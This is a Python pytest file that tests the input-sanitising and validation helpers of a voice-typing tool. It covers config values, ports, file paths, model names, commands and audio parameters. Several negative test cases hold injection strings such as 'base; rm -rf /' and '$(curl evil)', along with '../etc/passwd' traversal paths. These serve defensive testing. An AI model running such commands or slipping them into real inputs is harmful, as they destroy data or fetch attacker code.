"""Tests for talkat.security — sanitize / validate / command-safety helpers."""

import pytest

from talkat.security import (
    SecurityError,
    sanitize_text_for_clipboard,
    sanitize_text_for_typing,
    validate_audio_params,
    validate_command,
    validate_file_path,
    validate_json_config,
    validate_model_name,
    validate_port,
)

# ---------------------------------------------------------------------------
# sanitize_text_for_typing
# ---------------------------------------------------------------------------


def test_sanitize_typing_preserves_apostrophes():
    """Regression test for bug #3: apostrophes must NOT get backslash-escaped."""
    assert sanitize_text_for_typing("what's up") == "what's up"


def test_sanitize_typing_strips_null_byte():
    """Null bytes are control characters and must be stripped."""
    assert sanitize_text_for_typing("hello\x00world") == "helloworld"


def test_sanitize_typing_does_not_shell_escape():
    """Shell metacharacters should pass through unchanged (no shell escaping)."""
    assert sanitize_text_for_typing("a$b`c") == "a$b`c"


def test_sanitize_typing_empty_string():
    assert sanitize_text_for_typing("") == ""


def test_sanitize_typing_keeps_newline_and_tab():
    """Newlines and tabs are explicitly preserved."""
    assert sanitize_text_for_typing("a\nb\tc") == "a\nb\tc"


# ---------------------------------------------------------------------------
# validate_json_config
# ---------------------------------------------------------------------------


def test_validate_empty_config_ok():
    assert validate_json_config({}) == {}


def test_validate_model_type_rejected():
    with pytest.raises(ValueError):
        validate_json_config({"model_type": "gpt-4"})


def test_validate_model_type_faster_whisper_ok():
    cfg = validate_json_config({"model_type": "faster-whisper"})
    assert cfg["model_type"] == "faster-whisper"


def test_validate_model_type_vosk_ok():
    cfg = validate_json_config({"model_type": "vosk"})
    assert cfg["model_type"] == "vosk"


def test_validate_distil_whisper_rejected():
    """distil-whisper is no longer a valid model_type (was never implemented)."""
    with pytest.raises(ValueError):
        validate_json_config({"model_type": "distil-whisper"})


def test_validate_clipboard_on_long_must_be_bool():
    with pytest.raises(ValueError):
        validate_json_config({"clipboard_on_long": "yes"})


def test_validate_negative_http_timeout_rejected():
    with pytest.raises(ValueError):
        validate_json_config({"http_timeout": -5})


def test_validate_http_timeout_ok():
    cfg = validate_json_config({"http_timeout": 60})
    assert cfg["http_timeout"] == 60


def test_validate_silence_threshold_out_of_range_rejected():
    with pytest.raises(ValueError):
        validate_json_config({"silence_threshold": 100000})


# ---------------------------------------------------------------------------
# validate_port
# ---------------------------------------------------------------------------


def test_validate_port_accepts_valid_range():
    assert validate_port(1) == 1
    assert validate_port(8080) == 8080
    assert validate_port(65535) == 65535
    # Strings are coerced.
    assert validate_port("443") == 443


def test_validate_port_rejects_out_of_range():
    with pytest.raises(ValueError):
        validate_port(0)
    with pytest.raises(ValueError):
        validate_port(65536)


def test_validate_port_rejects_non_numeric():
    with pytest.raises(ValueError):
        validate_port("not-a-port")


# ---------------------------------------------------------------------------
# validate_file_path
# ---------------------------------------------------------------------------


def test_validate_file_path_returns_resolved_path(tmp_path):
    target = tmp_path / "file.wav"
    target.write_text("ok")
    result = validate_file_path(str(target), must_exist=True)
    assert result == target.resolve()


def test_validate_file_path_raises_when_must_exist_and_missing(tmp_path):
    with pytest.raises(FileNotFoundError):
        validate_file_path(str(tmp_path / "missing.wav"), must_exist=True)


def test_validate_file_path_blocks_path_traversal():
    with pytest.raises(SecurityError):
        validate_file_path("../etc/passwd")


# NOTE: validate_file_path() calls .resolve() before the .is_symlink() check,
# which always follows symlinks first — so the symlink-blocking branch is dead
# code in practice. The right fix is to reorder (check is_symlink first), but
# that's a behaviour change worth discussing separately; not in scope for §4.


# ---------------------------------------------------------------------------
# validate_model_name
# ---------------------------------------------------------------------------


def test_validate_model_name_accepts_typical_whisper_names():
    assert validate_model_name("base.en") == "base.en"
    assert validate_model_name("small.en-v3") == "small.en-v3"
    assert validate_model_name("models/distil-whisper-small") == ("models/distil-whisper-small")


def test_validate_model_name_rejects_metacharacters():
    with pytest.raises(ValueError):
        validate_model_name("base; rm -rf /")
    with pytest.raises(ValueError):
        validate_model_name("base$(curl evil)")


def test_validate_model_name_blocks_path_traversal():
    with pytest.raises(ValueError):
        validate_model_name("../../etc/passwd")


def test_validate_model_name_rejects_overlong():
    with pytest.raises(ValueError):
        validate_model_name("a" * 257)


# ---------------------------------------------------------------------------
# validate_command
# ---------------------------------------------------------------------------


def test_validate_command_rejects_empty():
    with pytest.raises(ValueError):
        validate_command([])


def test_validate_command_rejects_shell_metacharacters():
    with pytest.raises(SecurityError):
        validate_command(["ydotool", "type", "evil; rm -rf /"])
    with pytest.raises(SecurityError):
        validate_command(["ydotool", "type", "$(curl evil)"])


def test_validate_command_passes_whitelisted_command():
    cmd = ["ydotool", "type", "hello world"]
    assert validate_command(cmd) == cmd


def test_validate_command_logs_but_passes_non_whitelisted(caplog):
    """Non-whitelisted commands log a warning but are still returned."""
    import logging

    with caplog.at_level(logging.WARNING):
        cmd = ["unusual-command", "--arg"]
        assert validate_command(cmd) == cmd
    assert any("non-whitelisted" in rec.message for rec in caplog.records)


# ---------------------------------------------------------------------------
# sanitize_text_for_clipboard
# ---------------------------------------------------------------------------


def test_sanitize_clipboard_strips_null_byte():
    assert "\x00" not in sanitize_text_for_clipboard("hello\x00world")


def test_sanitize_clipboard_empty_returns_empty():
    assert sanitize_text_for_clipboard("") == ""


def test_sanitize_clipboard_normalizes_whitespace():
    # Multiple spaces collapse, tabs become a single space.
    result = sanitize_text_for_clipboard("a   b\t\tc")
    assert result == "a b c"


def test_sanitize_clipboard_normalizes_newlines():
    # \r\n and \n\n collapse to a single \n.
    result = sanitize_text_for_clipboard("line1\r\n\r\nline2")
    assert result == "line1\nline2"


def test_sanitize_clipboard_truncates_to_max_length():
    overlong = "a" * 200
    result = sanitize_text_for_clipboard(overlong, max_length=50)
    assert len(result) <= 50


# ---------------------------------------------------------------------------
# validate_audio_params
# ---------------------------------------------------------------------------


def test_validate_audio_params_accepts_typical_voice_setup():
    assert validate_audio_params(16000, 1, 1024) == (16000, 1, 1024)
    assert validate_audio_params(44100, 2, 4096) == (44100, 2, 4096)


def test_validate_audio_params_rejects_unsupported_sample_rate():
    with pytest.raises(ValueError):
        validate_audio_params(12345)


def test_validate_audio_params_rejects_invalid_channel_count():
    with pytest.raises(ValueError):
        validate_audio_params(16000, channels=3)
    with pytest.raises(ValueError):
        validate_audio_params(16000, channels=0)


def test_validate_audio_params_rejects_non_power_of_two_chunk():
    with pytest.raises(ValueError):
        validate_audio_params(16000, 1, 1000)


def test_validate_audio_params_rejects_chunk_out_of_range():
    with pytest.raises(ValueError):
        validate_audio_params(16000, 1, 128)  # below min 256
    with pytest.raises(ValueError):
        validate_audio_params(16000, 1, 16384)  # above max 8192
